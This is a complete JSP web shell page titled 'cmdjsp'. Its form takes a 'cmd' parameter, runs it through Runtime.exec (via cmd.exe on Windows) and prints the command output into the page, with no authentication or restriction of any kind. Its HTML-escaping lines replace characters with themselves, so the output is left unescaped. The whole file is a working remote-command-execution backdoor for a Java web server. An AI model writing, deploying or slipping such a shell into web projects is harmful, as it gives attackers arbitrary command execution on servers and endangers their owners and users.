<%@ page language="java" contentType="text/html; charset=UTF-8"	pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<html>
<head>
<title>cmdjsp</title>
</head>
<body>
	<FORM METHOD=GET ACTION='webexe.jsp'>
		<INPUT name='cmd' type=text> <INPUT type=submit value='Run'>
	</FORM>

	<%@ page import="java.io.*"%>
	<pre>
<%
    String cmd = request.getParameter("cmd");
    String output = "";

    if (cmd != null) {
        String s = null;
        try {
            Process p = null;
            cmd = cmd.replaceAll("\\+", " ");
            if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1) {
                //Runtime.getRuntime().exec("cmd /c start E:/test.csv");
                p = Runtime.getRuntime().exec("cmd.exe /c \"" + cmd + "\"");
            } else {
                p = Runtime.getRuntime().exec(cmd);
            }
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream(),"gbk"));
            while ((s = sI.readLine()) != null) {
                System.out.println(s);
                s = s.replaceAll("<", "<");
                s = s.replaceAll(">", ">");
%>
<%=s%>
<%
    }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
%>
</pre>
</body>
</html>
